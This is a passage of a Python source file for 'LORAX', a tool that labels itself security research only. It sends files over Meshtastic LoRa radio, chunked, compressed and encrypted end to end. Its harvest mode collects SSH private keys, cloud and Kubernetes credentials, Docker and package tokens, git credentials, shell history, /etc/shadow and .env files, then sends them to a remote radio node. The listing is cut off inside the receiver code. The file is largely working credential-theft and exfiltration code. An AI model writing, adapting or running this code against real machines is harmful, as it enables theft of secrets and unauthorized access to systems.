#!/usr/bin/env python3
"""
LORAX — LoRa Xtract  v1.2
Security research / demo only

Protocol v2: binary frames over Meshtastic DATA portnum.
Breaks wire compatibility with v1.x (text protocol).

Packet budget:
  237 bytes nominal LoRa payload
   54 bytes PKC overhead (32-byte ephemeral key + 16-byte MAC + 6-byte framing)
  ─────
  183 bytes available for application data
    8 bytes frame header (MAGIC 2 + TYPE 1 + TID 3 + SEQ 2) for CHUNK frames
  ─────
  175 bytes usable payload per chunk  (vs 110 bytes in v1.x)

Harvest:   lorax.py --mode harvest --radio 192.168.8.179 --dest '!eea17dfc'
Recv:      lorax.py --mode recv    --radio serial --output ./loot --extract
Scan:      lorax.py --mode scan    --radio 192.168.8.179
Probe:     lorax.py --mode probe   --radio 192.168.8.179 --dest '!eea17dfc'
Bench:     lorax.py --mode bench   --radio 192.168.8.179 --dest '!eea17dfc'
"""

TOOL_NAME = "LORAX"
TOOL_VER  = "1.2"
TOOL_DESC = "LoRa Xtract"

import argparse
import datetime
import gzip
import hashlib
import lzma
import os
import random
import string
import struct
import sys
import tarfile
import queue
import threading
import time

import base64

from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat,
)

import meshtastic.tcp_interface
import meshtastic.serial_interface
import serial.tools.list_ports
from pubsub import pub

# ---------------------------------------------------------------------------
# Protocol v2 — binary frames
# ---------------------------------------------------------------------------

LORAX_PORT       = 256          # meshtastic PRIVATE_APP portnum
RECV_TOPIC       = "meshtastic.receive"  # parent topic — catches decoded subtopic + undecoded packets
MAGIC            = b"LX"
MAX_CHUNK_DATA   = 175          # raw bytes per CHUNK frame payload
DEFAULT_DELAY    = 10
NACK_WAIT        = 90
MAX_RETRIES      = 5
CHECKPOINT_EVERY = 20           # request NACK check every N chunks mid-transfer
CHECKPOINT_WAIT  = 15           # seconds to wait for NACK on checkpoint
CHECK_TIMEOUT    = 8            # seconds to wait for HAVE on MD5 skip check
PROBE_TIMEOUT    = 30
UTIL_WARN        = 15.0         # % channel utilization — print warning
UTIL_BACKOFF     = 25.0         # % channel utilization — wait before sending
UTIL_POLL        = 30           # seconds between utilization polls during backoff

MAX_FILE_SIZE      = 512 * 1024
ENV_SEARCH_DEPTH   = 4
HISTORY_MAX_LINES  = 500

# Frame type bytes
T_START      = 0x01   # [total:2][algo:1][name_len:1][name:N]
T_CHUNK      = 0x02   # [seq:2][data:N]
T_END        = 0x03   # [md5:16]
T_ACK        = 0x04   # (no body)
T_NACK       = 0x05   # [count:2][seq:2 ...]
T_PING       = 0x06   # (no body)
T_PONG       = 0x07   # [snr_x10:2s][hops:1]
T_CHECK      = 0x08   # [md5:16][name:N]  — "do you already have this?"
T_HAVE       = 0x09   # [md5:16]          — "yes, skip it"
T_CHECKPOINT = 0x0A   # [last_seq:2]      — mid-transfer NACK request

# Compression algorithm IDs (stored in START frame)
COMP_NONE = 0x00
COMP_GZIP = 0x01
COMP_LZMA = 0x02
COMP_LABEL = {COMP_NONE: "none", COMP_GZIP: "gzip", COMP_LZMA: "lzma"}

# Encryption flag in T_START (4th byte — was name_len in unencrypted frames)
ENC_NONE = 0x00
ENC_ON   = 0x01

DEFAULT_KEYFILE = "./lorax.key"

# ---------------------------------------------------------------------------
# E2E crypto helpers
# ---------------------------------------------------------------------------

def _load_or_create_keypair(keyfile):
    """Load X25519 key pair from file, generating one if absent."""
    if os.path.exists(keyfile):
        with open(keyfile, "rb") as f:
            priv_bytes = f.read()
    else:
        priv_bytes = X25519PrivateKey.generate().private_bytes(
            Encoding.Raw, PrivateFormat.Raw, NoEncryption()
        )
        with open(keyfile, "wb") as f:
            f.write(priv_bytes)
        os.chmod(keyfile, 0o600)
        ok(f"Generated new key pair → {keyfile}")
    priv = X25519PrivateKey.from_private_bytes(priv_bytes)
    pub_bytes = priv.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    return priv_bytes, pub_bytes

def _derive_session_key(my_priv_bytes, their_pub_bytes, tid):
    """X25519 ECDH + HKDF-SHA256 → 32-byte session key scoped to this TID."""
    shared = X25519PrivateKey.from_private_bytes(my_priv_bytes).exchange(
        X25519PublicKey.from_public_bytes(their_pub_bytes)
    )
    return HKDF(SHA256(), 32, salt=tid.encode(), info=b"lorax-v1").derive(shared)

def _chunk_nonce(tid, seq):
    """12-byte deterministic nonce for (tid, seq) — safe since session key is ephemeral."""
    return tid.encode()[:3] + seq.to_bytes(2, "big") + b"\x00" * 7

def enc_chunk(session_key, tid, seq, plaintext):
    return ChaCha20Poly1305(session_key).encrypt(_chunk_nonce(tid, seq), plaintext, None)

def dec_chunk(session_key, tid, seq, ciphertext):
    return ChaCha20Poly1305(session_key).decrypt(_chunk_nonce(tid, seq), ciphertext, None)

def pubkey_to_b64(pub_bytes):
    return base64.urlsafe_b64encode(pub_bytes).decode()

def b64_to_pubkey(b64_str):
    return base64.urlsafe_b64decode(b64_str.strip() + "==")

# ---------------------------------------------------------------------------
# Harvest targets — ordered highest to lowest value
# ---------------------------------------------------------------------------

HARVEST_TARGETS = [
    ("SSH private keys",  ["~/.ssh/id_rsa", "~/.ssh/id_ed25519",
                            "~/.ssh/id_ecdsa", "~/.ssh/id_dsa",
                            "~/.ssh/authorized_keys"]),
    ("AWS credentials",   ["~/.aws/credentials", "~/.aws/config"]),
    ("GCloud",            ["~/.config/gcloud/credentials.db",
                            "~/.config/gcloud/application_default_credentials.json"]),
    ("Kubernetes",        ["~/.kube/config"]),
    ("Docker",            ["~/.docker/config.json"]),
    ("Terraform",         ["~/.terraform.d/credentials.tfrc.json"]),
    ("Package tokens",    ["~/.npmrc", "~/.pypirc", "~/.gem/credentials"]),
    ("Netrc",             ["~/.netrc"]),
    ("Git credentials",   ["~/.gitconfig", "~/.git-credentials"]),
    ("Shell history",     ["~/.bash_history", "~/.zsh_history",
                            "~/.fish/fish_history", "~/.sh_history"]),
    ("System",            ["/etc/passwd", "/etc/shadow"]),
]

HARVEST_KEYS = {
    "ssh":       "SSH private keys",
    "aws":       "AWS credentials",
    "k8s":       "Kubernetes",
    "docker":    "Docker",
    "git":       "Git credentials",
    "history":   "Shell history",
    "tokens":    "Package tokens",
    "terraform": "Terraform",
    "netrc":     "Netrc",
    "gcloud":    "GCloud",
    "system":    "System",
    "env":       ".env files",
}

# ---------------------------------------------------------------------------
# Terminal styling
# ---------------------------------------------------------------------------

class C:
    CYAN   = '\033[96m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    RED    = '\033[91m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RESET  = '\033[0m'

    @staticmethod
    def supports_color():
        return hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()

def c(color, text):
    if C.supports_color():
        return f"{color}{text}{C.RESET}"
    return text

def progress_bar(current, total, width=32):
    filled = int(width * current / total) if total else 0
    bar    = '█' * filled + '░' * (width - filled)
    pct    = current / total * 100 if total else 0
    return f"[{c(C.CYAN, bar)}] {c(C.BOLD, f'{current}/{total}')}  {pct:4.1f}%"

def eta_str(start_time, current, total, delay):
    remaining = (total - current) * delay
    m, s = divmod(remaining, 60)
    return f"  est. {m}m {s:02d}s" if remaining > 0 else "  done"

def banner():
    w     = 50
    line  = '═' * w
    title = f"  {TOOL_NAME}  ·  {TOOL_DESC}"
    ver   = f"  v{TOOL_VER}  ·  Security Research Only"
    print(c(C.CYAN, f"╔{line}╗"))
    print(c(C.CYAN, "║") + c(C.BOLD + C.CYAN, f"{title:<{w}}") + c(C.CYAN, "║"))
    print(c(C.CYAN, "║") + c(C.DIM,            f"{ver:<{w}}")   + c(C.CYAN, "║"))
    print(c(C.CYAN, f"╚{line}╝"))
    print()

def info(msg):    print(f"  {c(C.CYAN,   '·')} {msg}")
def ok(msg):      print(f"  {c(C.GREEN,  '✓')} {c(C.GREEN, msg)}")
def warn(msg):    print(f"  {c(C.YELLOW, '!')} {c(C.YELLOW, msg)}")
def err(msg):     print(f"  {c(C.RED,    '✗')} {c(C.RED, msg)}")
def section(msg): print(f"\n  {c(C.BOLD, msg)}")

# ---------------------------------------------------------------------------
# Binary framing
# ---------------------------------------------------------------------------

def make_tid():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=3))

def build_frame(ftype, tid, body=b""):
    return MAGIC + bytes([ftype]) + tid.encode() + body

def parse_frame(data):
    """Returns (ftype, tid, body) or (None, None, None) if not a valid LORAX frame."""
    if len(data) < 6 or data[:2] != MAGIC:
        return None, None, None
    return data[2], data[3:6].decode(errors="replace"), data[6:]

def get_lorax_payload(packet):
    """
    Robustly extract raw payload bytes from a received meshtastic packet.
    Handles the two formats meshtastic-python produces depending on version:
      - bytes under "payload" (most common)
      - base64 string under "payload" (MessageToDict path in some versions)
    Also tries the legacy "data" key as a fallback.
    """
    decoded = packet.get("decoded", {})
    raw = decoded.get("payload") or decoded.get("data")
    if raw is None:
        return b""
    if isinstance(raw, (bytes, bytearray)):
        return bytes(raw)
    if isinstance(raw, str):
        import base64 as _b64
        try:
            return _b64.b64decode(raw)
        except Exception:
            return b""
    return b""

def is_lorax_packet(packet):
    """Identify LORAX frames by MAGIC bytes — no portnum check needed."""
    p = get_lorax_payload(packet)
    return len(p) >= 2 and p[:2] == MAGIC

def send_frame(iface, ftype, tid, body=b"", dest=None):
    frame  = build_frame(ftype, tid, body)
    kwargs = {"portNum": LORAX_PORT, "wantAck": False}
    if dest:
        kwargs["destinationId"] = dest
    iface.sendData(frame, **kwargs)

# ---------------------------------------------------------------------------
# Compression — auto-pick best algorithm
# ---------------------------------------------------------------------------

def best_compress(data):
    """Try gzip and lzma; return (compressed, algo) using whichever is smallest."""
    candidates = [(data, COMP_NONE)]

    gz = gzip.compress(data, compresslevel=9)
    if len(gz) < len(data):
        candidates.append((gz, COMP_GZIP))

    try:
        lz = lzma.compress(data, preset=6)
        if len(lz) < len(data):
            candidates.append((lz, COMP_LZMA))
    except Exception:
        pass

    return min(candidates, key=lambda x: len(x[0]))

def decompress(data, algo):
    if algo == COMP_GZIP: return gzip.decompress(data)
    if algo == COMP_LZMA: return lzma.decompress(data)
    return data

# ---------------------------------------------------------------------------
# Connection helpers
# ---------------------------------------------------------------------------

def find_serial_port():
    KNOWN_VIDS = {0x10C4, 0x1A86, 0x0403, 0x239A, 0x303A}
    candidates = []
    all_ports  = list(serial.tools.list_ports.comports())
    for p in all_ports:
        desc = (p.description or "").lower()
        if p.vid in KNOWN_VIDS or any(k in desc for k in ("cp210", "ch340", "ftdi", "uart", "meshtastic")):
            candidates.append(p.device)
    if not candidates:
        candidates = [p.device for p in all_ports if p.device and "USB" in p.device.upper()]
    if not candidates:
        err("No serial ports found. Available:")
        for p in all_ports:
            print(f"       {p.device} — {p.description}")
        sys.exit(1)
    if len(candidates) > 1:
        warn(f"Multiple candidates: {candidates} — using {candidates[0]}")
        warn("Override with --port if wrong")
    return candidates[0]

def get_interface(radio, port=None):
    if radio.lower() == "serial":
        dev = port or find_serial_port()
        info(f"Connecting via serial: {c(C.BOLD, dev)}")
        return meshtastic.serial_interface.SerialInterface(dev)
    else:
        info(f"Connecting via TCP: {c(C.BOLD, radio)}")
        return meshtastic.tcp_interface.TCPInterface(radio)

def get_channel_util(iface):
    try:
        my_num  = iface.myInfo.my_node_num
        metrics = iface.nodesByNum.get(my_num, {}).get("deviceMetrics", {})
        return float(metrics.get("channelUtilization", 0.0))
    except Exception:
        return 0.0

def wait_for_clear_channel(iface, threshold=UTIL_BACKOFF):
    """Block until channel utilization drops below threshold."""
    util = get_channel_util(iface)
    if util < threshold:
        if util >= UTIL_WARN:
            warn(f"Channel utilization {util:.1f}% — elevated but proceeding")
        return
    warn(f"Channel utilization {util:.1f}% — waiting to drop below {threshold:.0f}%")
    while True:
        time.sleep(UTIL_POLL)
        util = get_channel_util(iface)
        info(f"Channel util: {util:.1f}%")
        if util < threshold:
            ok(f"Channel clear ({util:.1f}%) — proceeding")
            return

# ---------------------------------------------------------------------------
# Link probe
# ---------------------------------------------------------------------------

def probe_link(iface, dest, timeout=PROBE_TIMEOUT):
    """Send PING, wait for PONG. Returns (rtt_ms, snr_str, hops_str) or None."""
    tid        = make_tid()
    result     = {}
    pong_event = threading.Event()

    def on_pong(packet, interface):
        if not is_lorax_packet(packet):
            return
        ftype, ptid, body = parse_frame(get_lorax_payload(packet))
        if ftype == T_PONG and ptid == tid and len(body) >= 3:
            snr_raw, hops = struct.unpack(">hB", body[:3])
            result["snr"]  = f"{snr_raw / 10:.1f}"
            result["hops"] = str(hops)
            pong_event.set()

    pub.subscribe(on_pong, RECV_TOPIC)
    t0  = time.time()
    send_frame(iface, T_PING, tid, dest=dest)
    got = pong_event.wait(timeout=timeout)
    rtt = (time.time() - t0) * 1000

    try:
        pub.unsubscribe(on_pong, RECV_TOPIC)
    except Exception:
        pass

    return (rtt, result.get("snr", "?"), result.get("hops", "?")) if got else None

def snr_to_delay(snr_str):
    """Map measured SNR to a recommended chunk delay."""
    try:
        snr = float(snr_str)
    except (ValueError, TypeError):
        return DEFAULT_DELAY
    if snr >= 8:  return 5
    if snr >= 4:  return 8
    if snr >= 0:  return 12
    return 18

def probe_mode(iface, dest):
    section("Link probe")
    info(f"Pinging {c(C.BOLD, dest)}  (timeout {PROBE_TIMEOUT}s)...")
    result = probe_link(iface, dest)
    if result is None:
        err(f"No response after {PROBE_TIMEOUT}s — ensure recv is running on the other end")
        return
    rtt, snr, hops = result
    rec_delay = snr_to_delay(snr)
    ok(f"PONG  RTT: {c(C.BOLD, f'{rtt:.0f} ms')}  "
       f"SNR: {c(C.BOLD, f'{snr} dB')}  "
       f"Hops: {c(C.BOLD, hops)}")
    info(f"Recommended delay for this link: {c(C.BOLD, f'--delay {rec_delay}')}")

# ---------------------------------------------------------------------------
# Connectivity check — both sides run this; each pings the other
# ---------------------------------------------------------------------------

def conn_mode(iface, dest, interval=10):
    """
    Bidirectional link check.  Run on both sides simultaneously:
      Side A:  --mode conn --radio <A> --dest <B>
      Side B:  --mode conn --radio <B> --dest <A>

    Each side pings its dest every `interval` seconds and responds to any
    incoming PING with a PONG, so both terminals show live pass/fail status.
    """
    section("Connectivity check")
    my_id = f"!{iface.myInfo.my_node_num:08x}" if (
        hasattr(iface, "myInfo") and iface.myInfo) else "?"
    info(f"Local node  : {c(C.BOLD, my_id)}")
    info(f"Pinging     : {c(C.BOLD, dest)}  every {interval}s")
    info(f"Ctrl+C to stop")
    print()

    def on_packet(packet, interface=None):
        if not is_lorax_packet(packet):
            return
        ftype, tid, body = parse_frame(get_lorax_payload(packet))
        from_id = packet.get("fromId", "?")

        if ftype == T_PING:
            snr  = float(packet.get("rxSnr") or 0)
            hops = (packet.get("hopStart") or 0) - (packet.get("hopLimit") or 0)
            send_frame(iface, T_PONG, tid,
                       struct.pack(">hB", int(snr * 10), max(0, hops)))
            info(f"PING from {c(C.BOLD, from_id)} — replied PONG  "
                 f"(SNR: {snr} dB, hops: {hops})")

        elif ftype == T_PONG and len(body) >= 3:
            snr_raw, hops = struct.unpack(">hB", body[:3])
            ok(f"PONG from {c(C.BOLD, from_id)}  "
               f"SNR: {c(C.BOLD, f'{snr_raw / 10:.1f} dB')}  "
               f"Hops: {c(C.BOLD, str(hops))}  "
               f"{c(C.GREEN, '✓ LINK UP')}")

    pub.subscribe(on_packet, RECV_TOPIC)
    try:
        while True:
            tid = make_tid()
            send_frame(iface, T_PING, tid, dest=dest)
            info(f"PING → {c(C.BOLD, dest)}  [{c(C.DIM, tid)}]")
            time.sleep(interval)
    except KeyboardInterrupt:
        print()
        warn("Stopped")
    finally:
        try:
            pub.unsubscribe(on_packet, RECV_TOPIC)
        except Exception:
            pass

# ---------------------------------------------------------------------------
# MD5 skip check
# ---------------------------------------------------------------------------

def check_receiver_has(iface, dest, md5_hex, filename):
    """Ask receiver if it already holds this MD5. Returns True if HAVE received."""
    tid       = make_tid()
    md5_bytes = bytes.fromhex(md5_hex)
    have      = threading.Event()

    def on_have(packet, interface):
        if not is_lorax_packet(packet):
            return
        ftype, ptid, body = parse_frame(get_lorax_payload(packet))
        if ftype == T_HAVE and ptid == tid and body[:16] == md5_bytes:
            have.set()

    pub.subscribe(on_have, RECV_TOPIC)
    send_frame(iface, T_CHECK, tid, md5_bytes + filename.encode(), dest=dest)
    got = have.wait(timeout=CHECK_TIMEOUT)
    try:
        pub.unsubscribe(on_have, RECV_TOPIC)
    except Exception:
        pass
    return got

# ---------------------------------------------------------------------------
# Send engine
# ---------------------------------------------------------------------------

def send_bytes(iface, raw, filename, dest, delay, wait_ack=False, receiver_pubkey=None):
    """Compress, chunk and send raw bytes. Returns True on success."""
    payload, algo = best_compress(raw)
    saving        = 100 - (len(payload) / len(raw) * 100) if algo != COMP_NONE else 0
    chunks        = [payload[i:i + MAX_CHUNK_DATA]
                     for i in range(0, len(payload), MAX_CHUNK_DATA)]
    total         = len(chunks)
    tid           = make_tid()
    md5_hex       = hashlib.md5(raw).hexdigest()
    md5_bytes     = bytes.fromhex(md5_hex)
    fname_bytes   = filename.encode()

    # E2E encryption setup
    session_key = None
    if receiver_pubkey:
        ephem_priv, ephem_pub = (lambda k: (
            k.private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption()),
            k.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw),
        ))(X25519PrivateKey.generate())
        session_key = _derive_session_key(ephem_priv, receiver_pubkey, tid)

    section("Transfer details")
    info(f"File        : {c(C.BOLD, filename)}")
    info(f"Original    : {len(raw):,} bytes")
    if algo != COMP_NONE:
        info(f"Compressed  : {len(payload):,} bytes  "
             f"{c(C.GREEN, f'({saving:.1f}% smaller, {COMP_LABEL[algo]})')}")
    else:
        info(f"Compression : no benefit")
    info(f"Chunks      : {total} × up to {MAX_CHUNK_DATA} bytes")
    info(f"Trans ID    : {c(C.BOLD, tid)}")
    info(f"MD5         : {c(C.DIM, md5_hex)}")
    info(f"Dest        : {c(C.BOLD, dest)}")
    info(f"Encrypted   : {c(C.GREEN, 'yes (E2E)') if session_key else c(C.YELLOW, 'no')}")
    est = total * delay
    info(f"Delay       : {delay}s  — est. {est // 60}m {est % 60:02d}s")
    print()

    ack_event    = threading.Event()
    nack_missing = []

    def on_response(packet, interface):
        if not is_lorax_packet(packet):
            return
        ftype, ptid, body = parse_frame(get_lorax_payload(packet))
        if ptid != tid:
            return
        if ftype == T_ACK:
            nack_missing.clear()
            ack_event.set()
        elif ftype == T_NACK and len(body) >= 2:
            count = struct.unpack(">H", body[:2])[0]
            nack_missing[:] = list(struct.unpack(f">{count}H", body[2:2 + count * 2]))
            ack_event.set()

    pub.subscribe(on_response, RECV_TOPIC)
    success = False

    try:
        # Build T_START body
        # Unencrypted: [total:2][algo:1][ENC_NONE:1][name_len:1][name:N]
        # Encrypted:   [total:2][algo:1][ENC_ON:1][ephem_pub:32][nonce:12][ciphertext:M+16]
        if session_key:
            nonce      = os.urandom(12)
            ciphertext = ChaCha20Poly1305(session_key).encrypt(
                nonce, bytes([len(fname_bytes)]) + fname_bytes, None
            )
            start_body = struct.pack(">HBB", total, algo, ENC_ON) + ephem_pub + nonce + ciphertext
        else:
            start_body = struct.pack(">HBB", total, algo, ENC_NONE) + bytes([len(fname_bytes)]) + fname_bytes
        send_frame(iface, T_START, tid, start_body, dest=dest)
        time.sleep(delay)

        to_send    = list(range(1, total + 1))
        start_time = time.time()

        for attempt in range(1, MAX_RETRIES + 2):
            if attempt > 1:
                section(f"Retransmit round {attempt - 1}  —  {len(to_send)} chunk(s)")
                send_frame(iface, T_START, tid, start_body, dest=dest)
                time.sleep(delay)

            for i, seq in enumerate(to_send, 1):
                chunk_data = enc_chunk(session_key, tid, seq, chunks[seq - 1]) if session_key else chunks[seq - 1]
                body = struct.pack(">H", seq) + chunk_data
                done = (total - len(to_send)) + i
                _eol = '\033[K' if C.supports_color() else '   '
                print(f"\r  {c(C.CYAN, '→')} Sending  "
                      f"{progress_bar(done, total)}"
                      f"{eta_str(start_time, done, total, delay)}{_eol}",
                      end="", flush=True)
                send_frame(iface, T_CHUNK, tid, body, dest=dest)
                time.sleep(delay)

                # Mid-transfer checkpoint: ask receiver to NACK any gaps so far
                if i % CHECKPOINT_EVERY == 0 and i < len(to_send):
                    util = get_channel_util(iface)
                    if util >= UTIL_WARN:
                        warn(f"\n  Channel util {util:.1f}% — consider increasing --delay")
                    cp_body = struct.pack(">H", seq)
                    send_frame(iface, T_CHECKPOINT, tid, cp_body, dest=dest)
                    ack_event.clear()
                    if ack_event.wait(timeout=CHECKPOINT_WAIT) and nack_missing:
                        urgent = list(nack_missing)
                        nack_missing.clear()
                        warn(f"Checkpoint NACK — retransmitting {len(urgent)} chunk(s)")
                        for ms in urgent:
                            rb = struct.pack(">H", ms) + chunks[ms - 1]
                            send_frame(iface, T_CHUNK, tid, rb, dest=dest)
                            time.sleep(delay)
                    ack_event.clear()

            send_frame(iface, T_END, tid, md5_bytes, dest=dest)
            _eol = '\033[K' if C.supports_color() else '   '
            print(f"\r  {c(C.CYAN, '→')} Sending  {progress_bar(total, total)}  END sent{_eol}")

            if not wait_ack:
                ok(f"Sent  [{c(C.DIM, tid)}]")
                success = True
                break

            info(f"Waiting up to {NACK_WAIT}s for ACK/NACK...")
            ack_event.clear()
            got = ack_event.wait(timeout=NACK_WAIT)

            if not got:
                warn(f"No response after {NACK_WAIT}s")
                if attempt <= MAX_RETRIES:
                    to_send = list(range(1, total + 1))
                    continue
                err("Max retries reached — transfer may have failed")
                break

            if not nack_missing:
                ok(f"ACK — transfer complete  [{c(C.DIM, tid)}]")
                success = True
                break

            to_send = list(nack_missing)
            nack_missing.clear()
            if attempt > MAX_RETRIES:
                err(f"Max retries reached — {len(to_send)} chunk(s) still missing")
                break

    finally:
        try:
            pub.unsubscribe(on_response, RECV_TOPIC)
        except Exception:
            pass

    return success

def send_file(iface, filepath, dest, delay, wait_ack=False, receiver_pubkey=None):
    if not os.path.exists(filepath):
        err(f"File not found: {filepath}")
        sys.exit(1)
    with open(filepath, "rb") as f:
        raw = f.read()
    send_bytes(iface, raw, os.path.basename(filepath), dest, delay, wait_ack, receiver_pubkey)

# ---------------------------------------------------------------------------
# Benchmark
# ---------------------------------------------------------------------------

BENCH_SIZES = [
    ("1 B",    1),
    ("1 KB",   1024),
    ("10 KB",  10 * 1024),
    ("100 KB", 100 * 1024),
]

def benchmark_mode(iface, dest, delay, wait_ack=False, receiver_pubkey=None):
    section(f"Benchmark  —  {MAX_CHUNK_DATA} bytes/chunk  delay: {delay}s")
    info("Payloads use random bytes (worst-case — no compression benefit)")
    print()
    results = []
    for label, size in BENCH_SIZES:
        payload    = os.urandom(size)
        num_chunks = (size + MAX_CHUNK_DATA - 1) // MAX_CHUNK_DATA
        section(f"Sending {label}  ({num_chunks} chunk(s) expected)")
        t0      = time.time()
        success = send_bytes(iface, payload, f"bench_{size}b.bin", dest, delay, wait_ack, receiver_pubkey)
        elapsed = time.time() - t0
        tput    = size / elapsed if (success and elapsed > 0) else 0
        results.append((label, size, num_chunks, elapsed, tput, success))

    section("Results")
    hdr = f"  {'Size':<10} {'Chunks':>8} {'Time':>10} {'Throughput':>14}  Status"
    print(c(C.BOLD, hdr))
    print("  " + "─" * 50)
    for label, size, chunks, elapsed, tput, success in results:
        m, s   = divmod(int(elapsed), 60)
        status = c(C.GREEN, "OK") if success else c(C.RED, "FAIL")
        tp_str = f"{tput:.1f} B/s" if tput > 0 else "—"
        print(f"  {label:<10} {chunks:>8} {m}m {s:02d}s {tp_str:>14}  {status}")
    print()
    info(f"Chunk size: {MAX_CHUNK_DATA} bytes raw  ·  Delay: {delay}s/chunk")

# ---------------------------------------------------------------------------
# Harvest
# ---------------------------------------------------------------------------

def find_env_files(base="~", max_depth=ENV_SEARCH_DEPTH):
    skip = {".git", "node_modules", "__pycache__", ".venv", "venv", ".tox"}
    base = os.path.expanduser(base)
    results = []
    for root, dirs, files in os.walk(base):
        if root[len(base):].count(os.sep) >= max_depth:
            dirs.clear()
            continue
        dirs[:] = [d for d in dirs if d not in skip]
        for f in files:
            if f == ".env" or f.endswith(".env"):
                results.append(os.path.join(root, f))
    return results

def read_file_content(path, category):
    """Read file, applying line-count cap for shell history."""
    with open(path, "rb") as f:
        data = f.read()
    if category == "Shell history":
        lines = data.split(b"\n")
        if len(lines) > HISTORY_MAX_LINES:
            data = b"\n".join(lines[-HISTORY_MAX_LINES:])
    return data

def harvest_files(silent=False, only=None):
    """
    Collect files in priority order.
    Returns list of (arcname, path, category) tuples.
    only: set of short key strings, or None for all.
    """
    found       = []
    total_bytes = 0
    include_env = only is None or "env" in only
    allowed     = None if only is None else {
        HARVEST_KEYS[k] for k in only if k != "env" and k in HARVEST_KEYS
    }

    for category, patterns in HARVEST_TARGETS:
        if allowed is not None and category not in allowed:
            continue
        hits = []
        for pattern in patterns:
            path = os.path.expanduser(pattern)
            if os.path.isfile(path) and os.access(path, os.R_OK):
                size = os.path.getsize(path)
                if size <= MAX_FILE_SIZE:
                    hits.append((path, size))
                elif not silent:
                    warn(f"Skipping {path} ({size:,} bytes — over limit)")
        if hits and not silent:
            print(f"    {c(C.GREEN, '+')} {c(C.BOLD, category)}")
            for path, size in hits:
                print(f"        {c(C.DIM, path.replace(os.path.expanduser('~'), '~'))}  {size:,} bytes")
            total_bytes += sum(s for _, s in hits)
        for path, size in hits:
            arcname = path.lstrip("/").replace(os.path.expanduser("~").lstrip("/"), "home")
            found.append((arcname, path, category))

    if include_env:
        env_files = find_env_files()
        if env_files and not silent:
            print(f"    {c(C.GREEN, '+')} {c(C.BOLD, '.env files')}  ({len(env_files)} found)")
        for path in env_files:
            if os.path.getsize(path) <= MAX_FILE_SIZE:
                size = os.path.getsize(path)
                if not silent:
                    print(f"        {c(C.DIM, path)}  {size:,} bytes")
                total_bytes += size
                arcname = path.lstrip("/").replace(os.path.expanduser("~").lstrip("/"), "home")
                found.append((arcname, path, ".env files"))

    return found, total_bytes

def harvest_mode(iface, dest, delay, scan_only=False, only=None, wait_ack=False, receiver_pubkey=None):
    section("Scanning for high-value files")
    if only:
        info(f"Filter     : {c(C.BOLD, ', '.join(sorted(only)))}")
    found, raw_bytes = harvest_files(only=only)

    if not found:
        warn("Nothing found — check permissions or run with elevated privileges")
        return

    print()
    info(f"{c(C.BOLD, str(len(found)))} file(s) found  ({raw_bytes:,} bytes on disk)")
    info(f"Sending in priority order — most valuable files first")

    if scan_only:
        info("Scan only — not sending")
        return

    wait_for_clear_channel(iface)

    sent = skipped = failed = 0

    for arcname, path, category in found:
        section(f"File: {c(C.BOLD, arcname)}")
        try:
            raw     = read_file_content(path, category)
            md5_hex = hashlib.md5(raw).hexdigest()
        except (PermissionError, OSError) as e:
            warn(f"Cannot read: {e}")
            failed += 1
            continue

        info(f"Checking receiver cache...")
        if check_receiver_has(iface, dest, md5_hex, arcname):
            ok("Receiver already has this file — skipping")
            skipped += 1
            continue

        wait_for_clear_channel(iface)
        if send_bytes(iface, raw, arcname, dest, delay, wait_ack, receiver_pubkey):
            sent += 1
        else:
            failed += 1

    section("Harvest complete")
    info(f"Sent: {c(C.GREEN, str(sent))}  "
         f"Skipped (cached): {c(C.DIM, str(skipped))}  "
         f"Failed: {c(C.RED, str(failed)) if failed else c(C.DIM, '0')}")

# ---------------------------------------------------------------------------
# Receive
# ---------------------------------------------------------------------------

recv_cache = set()   # MD5 hashes of files already on disk

def build_recv_cache(output_dir):
    """Index existing files in output_dir so duplicate transfers can be rejected."""
    if not os.path.isdir(output_dir):
        return
    for root, _, files in os.walk(output_dir):
        for fname in files:
            path = os.path.join(root, fname)
            try:
                with open(path, "rb") as f:
                    recv_cache.add(hashlib.md5(f.read()).hexdigest())
            except OSError:
                pass
    if recv_cache:
        info(f"Receiver cache: {len(recv_cache)} existing file(s) indexed")

def extract_tar(tar_path, output_dir):
    extracted = []
    with tarfile.open(tar_path, "r:*") as tar:
        for member in tar.getmembers():
            # Sanitise against path traversal
            member_path = os.path.realpath(os.path.join(output_dir, member.name))
            if not member_path.startswith(os.path.realpath(output_dir)):
                warn(f"Skipping unsafe path: {member.name}")
                continue
            tar.extract(member, path=output_dir)
            extracted.append(member.name)
    return extracted

def make_receiver(iface, output_dir, auto_extract=False, my_priv_bytes=None):
    """
    Returns (on_receive, active) where active is a dict of in-progress transfers
    keyed by TID.  Each TID gets its own daemon thread so multiple simultaneous
    senders are handled independently.
    my_priv_bytes: X25519 private key bytes for E2E decryption (None = no E2E).
    """
    active      = {}               # TID → ctx dict
    active_lock = threading.Lock()

    # ------------------------------------------------------------------
    # Save helper (runs inside each transfer thread)
    # ------------------------------------------------------------------
    def _save(ctx, expected_md5):
        joined  = b"".join(ctx["chunks"][i] for i in range(1, ctx["total"] + 1))
        raw     = decompress(joined, ctx["algo"])
        md5_hex = hashlib.md5(raw).hexdigest()
        if md5_hex != expected_md5:
            err(f"MD5 MISMATCH — expected {expected_md5}, got {md5_hex}")
        else:
            ok(f"MD5 verified  [{c(C.DIM, md5_hex)}]")
            recv_cache.add(md5_hex)
        out = os.path.join(output_dir, ctx["filename"].lstrip("/"))
        os.makedirs(os.path.dirname(out) or output_dir, exist_ok=True)
        with open(out, "wb") as f:
            f.write(raw)
        ok(f"Saved → {c(C.BOLD, out)}  ({len(raw):,} bytes)")
        if auto_extract and ctx["filename"].endswith(".tar"):
            try:
                extract_dir = os.path.splitext(out)[0]
                os.makedirs(extract_dir, exist_ok=True)
                extracted = extract_tar(out, extract_dir)
